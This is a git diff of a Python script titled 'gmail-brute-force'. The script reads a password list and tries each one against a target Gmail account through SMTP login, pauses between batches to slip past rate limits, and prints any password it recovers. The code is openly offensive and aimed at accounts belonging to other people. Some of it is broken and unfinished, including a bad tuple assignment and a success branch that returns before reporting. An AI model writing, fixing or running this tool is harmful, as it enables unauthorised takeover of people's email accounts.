@@ -1,13 +1,75 @@
 #!/usr/bin/python3
-import argparse, smtplib, os
-from pprint import pprint
+import argparse, smtplib, os, time, sys, random, datetime
 
-"""
+# TODOs
+# test on new Linux, Mac, and Windows machine
+# 
 
-also turn this into script -l0kueser vprolly
+BATCH_ATTEMPTS = 10
 
-"""
 
+#
+# try to login into the gmail account
+#
+
+def authenticate(server, target_email, password):
+    try:
+        # attempt to login 
+        server.login(target_email, password)
+        return True 
+    except smtplib.SMTPAuthenticationError:
+        # error that happens when the password is incorrect 
+        return False 
+    except Exception as e:
+        # print all other types of errors and exit program 
+        print(f"Error: {str(e)}")
+        exit()
+
+#
+# iterate through the password list 
+#
+
+def attack(target_email, password_list, attack_duration):
+    # start a server
+    server = smtp()                                                         # halt is here 
+    # placeholders
+    valid_password = None
+    password_list_index, counter = 0 
+    print("1") #                                                        TODO does not print 
+    # loop thru passwords 
+    for password in password_list:
+        auth_result = authenticate(server, target_email, password)
+        if auth_result == True: 
+            valid_password = password 
+
+            return 
+        elif (counter < BATCH_ATTEMPTS): 
+            counter += 1
+            progress(password_list_index, len(password_list))
+        else: 
+            # wait  
+            print(f"Sleeping for {attack_duration} seconds.")
+            time.sleep(int(attack_duration))
+            # restart server 
+            server.close()
+            server = smtp()
+            # reset counter
+            counter = 0
+
+    if valid_password is None:
+        server.close()
+        print("No password was found. Please use a different password list.")
+        print("To save time, ensure your new password list excludes passwords you have already tried.")
+        print("You can do this by: $ file1 file 2 ____________________")                                # TODO put in command 
+        print("Thank you for using gmail-brute-force. Goodbye!")
+        exit() 
+    else: 
+        server.close()
+        # display product 
+        # display credential page
+        print(f"Credentials\nTarget email: {target_email}\nPassword: {valid_password}")
+        curr_time = datetime.datetime.now()
+        print("Current time: " + curr_time.strftime("%d-%m-%Y %H:%M:%S"))
 
 #
 # Connect to GMail's SMTP server 
@@ -43,10 +105,9 @@ def product_display():
     # clear terminal 
     os.system("cls" if os.name == "nt" else "clear")
     # print title 
-    print("*****                   *****" +
-          "***** GMAIL BRUTE FORCE *****" + 
-          "*****                   *****")
-    
+    print("*****                   *****\n" +
+          "***** GMAIL BRUTE FORCE *****\n" + 
+          "*****                   *****\n")
 
 #
 # execute the mail program 
@@ -55,42 +116,24 @@ def product_display():
 def main():
     # attacker initial input 
     args = cmd_parse()
+    target_email = args.target_email 
+    attack_duration = args.attack_duration
 
     # show product info
     product_display()
     
-    print(args)
-
     # make a list of the passwords from a file 
     with open(args.password_list) as file:
         pass_list = file.readlines()
         
     # remove new line characters
-    pass_list = [x.strip() for x in pass_list]
+    password_list = [x.strip() for x in pass_list]
     file.close()
+    
+    attack(target_email, password_list, attack_duration)
 
-    print(pass_list)
-
-
-    user_input = 'q' # input("prompt")
-
-    # command input 
-    while user_input != "q":
-
-        # command list 
-        # start attack
-        # stop attack 
-        # quit program 
-        # [.... %90 percent finished ]
-        # notify that it will wait for user input, so do not enter?? 
-
-        print()
-
-
-        user_input = input("prompt")
-
-    print("end")
-
+    print("Thank you for using gmail-brute-force. Goodbye.")
+    print("END")
 
 if __name__ == "__main__":
     main()
